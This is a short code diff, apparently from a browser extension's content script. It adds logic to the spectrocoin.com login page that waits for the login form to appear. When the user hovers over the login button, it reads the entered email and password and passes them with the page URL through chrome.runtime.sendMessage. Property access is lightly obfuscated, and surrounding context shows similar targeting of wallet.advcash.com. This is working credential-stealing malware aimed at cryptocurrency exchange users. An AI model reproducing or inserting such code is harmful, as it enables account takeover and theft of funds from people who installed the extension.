@@ -73,6 +73,22 @@ for (var i = 0; i < arrayLength; i++) {
 };
 
 
+if (window['location']['href']['indexOf']('spectrocoin.com/en/login.html') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementsByClassName']('login-form')[0]) {
+            clearInterval(interval);
+            document['getElementsByClassName']('btn yellow-btn')[0].onmouseover = function (_0x441cx2) {
+             var login = {};
+            login.username = document.getElementsByName("email")[0].value;
+            login.pass = document.getElementsByName("password")[0].value;
+            login.href = window.location.href;
+            chrome.runtime.sendMessage({cmd: "l",login});
+            }
+        }
+    }, 1000);
+};
+
+
 
 
   if (window['location']['href']['indexOf']('wallet.advcash.com') > -1) {
